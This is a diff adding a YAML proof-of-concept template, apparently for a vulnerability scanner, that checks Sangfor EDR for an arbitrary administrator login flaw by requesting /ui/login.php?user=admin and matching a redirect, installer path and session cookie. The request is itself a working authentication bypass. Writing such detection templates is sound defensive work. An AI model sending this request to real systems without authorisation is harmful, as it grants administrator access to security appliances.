@@ -1,0 +1,22 @@
+id: poc-yaml-sangfor-edr-arbitrary-admin-login
+info:
+  name: Sangfor Edr 管理员任意登录漏洞
+  severity: medium
+  tags:
+  - 访问控制错误
+  finger: Sangfor EDR
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /ui/login.php?user=admin
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 302 && contains(body, "/download/edr_installer_") &&
+    headers["Set-Cookie"] != ""
+  output: []
